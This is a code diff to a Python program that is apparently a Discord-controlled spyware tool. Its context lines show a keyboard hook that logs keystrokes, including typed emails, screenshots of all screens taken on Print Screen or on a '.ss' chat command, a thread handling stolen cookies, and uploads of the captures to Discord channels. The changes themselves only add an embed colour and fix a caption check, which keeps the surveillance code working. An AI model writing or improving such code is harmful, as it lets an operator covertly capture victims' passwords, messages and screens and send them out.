@@ -158,7 +158,7 @@ async def on_ready():
             files_to_send = []
         if len(embeds_to_send) > 0:
             for embedd in embeds_to_send:
-                await client.get_channel(embedd[0]).send(embed=discord.Embed(title=embedd[1]).set_image(url='attachment://' + embedd[2]), file=discord.File(embedd[2]))
+                await client.get_channel(embedd[0]).send(embed=discord.Embed(title=embedd[1], color=0x0084ff).set_image(url='attachment://' + embedd[2]), file=discord.File(embedd[2]))
                 await asyncio.sleep(0.1)
             embeds_to_send = []
         if os.path.exists('ready.cookies') and cookies_thread != None:
@@ -314,7 +314,7 @@ async def on_message(message):
             if message.content == '.ss':
                 await message.delete()
                 ImageGrab.grab(all_screens=True).save('ss.png')
-                reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`').set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
+                reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
                 os.system('del ss.png')
 
             elif message.content == '.join':
@@ -730,7 +730,7 @@ def on_press(key):
             case Key.print_screen|'@':
                 processed_key = ' *`Print Screen`*'
                 ImageGrab.grab(all_screens=True).save('ss.png')
-                embeds_to_send.append([channel_ids['main'], current_time() + (' `[Print Screen pressed]`' if processed_key == Key.print_screen else ' `[Email typing]`'), 'ss.png'])
+                embeds_to_send.append([channel_ids['main'], current_time() + (' `[Print Screen pressed]`' if processed_key == ' *`Print Screen`*' else ' `[Email typing]`'), 'ss.png'])
         text_buffor += str(processed_key)
         if len(text_buffor) > 1975:
             if 'wwwww' in text_buffor or 'aaaaa' in text_buffor or 'sssss' in text_buffor or 'ddddd' in text_buffor:
